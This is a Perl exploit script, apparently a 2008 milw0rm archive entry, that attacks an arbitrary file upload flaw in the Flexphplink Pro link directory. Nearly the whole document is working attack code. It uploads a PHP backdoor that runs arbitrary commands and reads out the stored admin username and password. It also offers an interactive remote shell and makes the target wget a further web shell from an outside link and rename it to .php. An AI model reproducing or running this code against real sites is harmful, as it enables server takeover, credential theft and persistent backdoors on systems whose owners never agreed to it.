#!/usr/bin/perl

# HAPPY CHRISTMAS !!
# Flexphplink Pro
# http://www.hotscripts.com/jump.php?listing_id=21062&jump_type=1
# Bug: Arbitrary File Upload
# * I coded this exploit just for fun ;)
# Exploit coded by Osirys
# osirys[at]live[dot]it
# http://osirys.org
# Greets: x0r, miclen, emgent, str0ke, Todd and AlpHaNiX

# Example:
# osirys[~]>$ perl exp.txt http://localhost/flexphplinkproen/
#   ============================
#      Flexphplink Pro Exploit
#       Coded by Osirys
#       osirys[at]live[dot]it
#       Proud to be italian
#   ============================
# [+] http://localhost/flexphplinkproen/ backdoored, just type your choise:
#     1 - Admin Details Disclosure
#     2 - Arbitrary Command Execution
#     3 - Shell upload
#     4 - Exit
# 1
# [+] Extracting Admin Login Details .
# [+] Done:
#     Username: admin
#     Password: adminz
# osirys[~]>$


use HTTP::Request;
use LWP::UserAgent;


my $path   =  "/submitlink.php";
my $u_path =  "/linkphoto/";
my $l_file =  "back.php";

my $code   =  "<?php  echo \"<b>RCE backdoor</b><br><br>\";if(!empty(\$_GET['cmd'])&&empty".
              "(\$_GET['adm'])){echo\"<b>CMD: </b>\";system(\$_GET['cmd']);}elseif((\$_GET".
              "['adm']==\"get\")&&empty(\$_GET['cmd'])){if(is_file(\"../const.inc.php3\" )".
              "){include('../const.inc.php3');}elseif(is_file(\"../const.inc.php\")){ incl".
              "ude ('../const.inc.php');}echo \"<b>Username: </b>\$admin_username\";  echo".
              "\"<br>\";     echo   \"<b>Password: </b>\$admin_password\";   }          ?>";

my $host   = $ARGV[0];

($host) || help("-1");
cheek($host) == 1 || help("-2");
&banner;

open  ($file, ">", $l_file);
print  $file  "$code\n";
close ($file);

$dir = `pwd`;
my $f_path = $dir."/".$l_file;
$f_path =~ s/\n//;

my $url  = $host.$path;
my $ua   = LWP::UserAgent->new;
$time = time();
my $post = $ua->post($url,
                      Content_Type => 'form-data',
                      Content      => [
                                         title    => 'abco',
                                         url      => 'def',
                                         userfile => [$f_path, '.php'],
                                         addlink  => 'Add'
                                      ]
                    );

if (($post->is_success)&&($post->as_string=~ /Thank you for your submission/)) {
    `rm -rf $f_path`;
    cheek_fname($time);
    ($rcefile) || die "[-] Unable to find phpscript uploaded\n";
    &go;
}
else {
    print "[-] Unable to upload evil php-code !\n";
    exit(0);
}

sub go() {
    my $error = $_[0];
    if ($error == -1) {
        print "[-] Bad Choice\n\n";
    }
    elsif ($error == -2) {
        print "[-] Bad shell url\n\n";
    }
    print "[+] $host backdoored, just type your choise:\n".
          "    1 - Admin Details Disclosure\n".
          "    2 - Arbitrary Command Execution\n".
          "    3 - Shell upload\n".
          "    4 - Exit\n";

    $choice = <STDIN>;
    $choice =~ /1|2|3|4/ || go("-1");
    if ($choice == 1) {
        &adm_disc;
    }
    elsif ($choice == 2) {
        &exec_cmd;
    }
    elsif ($choice == 3) {
        &shell_up;
    }
    elsif ($choice == 4) {
        print "[-] Quitting ..\n";
        exit(0);
    }
}

sub adm_disc {
    print "[+] Extracting Admin Login Details ..\n";
    $exec_url = ($host.$u_path.$time.".php?adm=get");
    $re = query($exec_url);
    if ($re =~ /Username: <\/b>(.*)<br><b>Password: <\/b>(.*)/) {
        my($user,$pass) = ($1,$2);
        print "[+] Done:          \n".
              "    Username: $user\n".
              "    Password: $pass\n";
    }
    else {
        print "[-] Can't extract Admin Details.\n\n";
        &go;
    }
} 

sub exec_cmd {
    print "shell\$>\n";
    $cmd = <STDIN>;
    $cmd !~ /exit/ || die "[-] Quitting ..\n";
    $exec_url = ($host.$u_path.$time.".php?cmd=".$cmd);
    $re = query($exec_url);
    if ($re =~ /<b>CMD: <\/b>(.*)/) {
        print "[*] $1\n";
        &exec_cmd;
    }
    else {
        print "[-] Undefined output or bad cmd !\n";
        &exec_cmd;
    }
}

sub shell_up {
    print "[+] Type now a link for your .txt shell\n".
          "    Shell name must be with .txt extension\n";
    $s_link = <STDIN>;
    $s_link =~ /.*\/(.*)\.txt/ || &go("-2");
    $s_name = $1;
    $exec_url  = ($host.$u_path.$time.".php?cmd=wget ".$s_link);
    $exec_url2 = ($host.$u_path.$time.".php?cmd=mv ".$s_name.".txt ".$s_name.".php");
    query($exec_url); query($exec_url2);
    print "[+] Your shell should be here: ".$host.$u_path.$s_name.".php\n";
}

sub cheek_fname() {
    my $time = $_[0];
    my $name = $time.".php";
    $re = query($host.$u_path.$name);
    if ($re =~ /<b>RCE backdoor<\/b>/) {
        $rcefile = $name;
        return;
    }
}

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new(GET => $link);
    my $ua = LWP::UserAgent->new();
    $ua->timeout(4);
    my $response = $ua->request($req);
    return $response->content;
}

sub cheek() {
    my $host = $_[0];
    if ($host =~ /http:\/\/(.*)/) {
        return 1;
    }
    else {
        return 0;
    }
}

sub banner {
    print "\n".
          "  ============================ \n".
          "     Flexphplink Pro Exploit   \n".
          "      Coded by Osirys          \n".
          "      osirys[at]live[dot]it    \n".
          "      Proud to be italian      \n".
          "  ============================ \n\n";
}

sub help() {
    my $error = $_[0];
    if ($error == -1) {
        &banner;
        print "\n[-] Cheek that you provide a hostname address!\n";
    }
    elsif ($error == -2) {
        &banner;
        print "\n[-] Bad hostname address !\n";
    }
    print "[*] Usage : perl $0 http://hostname/cms_path\n\n";
    exit(0);
}

# milw0rm.com [2008-12-28]